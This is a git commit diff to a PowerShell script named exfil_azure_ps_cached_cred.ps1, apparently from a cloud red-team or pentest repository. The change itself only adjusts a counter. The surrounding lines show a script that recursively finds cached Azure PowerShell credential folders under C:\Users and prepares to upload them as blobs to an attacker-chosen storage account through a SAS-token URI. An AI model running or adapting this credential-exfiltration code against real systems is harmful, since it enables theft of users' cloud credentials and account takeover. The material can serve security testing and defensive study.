81378b204cec0cc828eaf0ac1ba76ff08cd87e93
David Okeyode <asegunlolu@hotmail.com>
2020-09-18 10:44:09 +0100

    Update exfil_azure_ps_cached_cred.ps1

--- exfil_azure_ps_cached_cred.ps1
+++ exfil_azure_ps_cached_cred.ps1
@@ -1,12 +1,11 @@
 ﻿$source = gci -Path "C:\Users" -Recurse -Filter ".Azure" -Directory
 $uri = "https://<storage_acct>/<container>/$($zip)<sas_token>"
-$count = 10
+$count = 0
 $headers = @{
     'x-ms-blob-type' = 'BlockBlob'
 }
 
 Foreach ($s in $source) {
-    $count
     $count++
     $Fullname = $s.FullName
     $BaseName = $s.BaseName
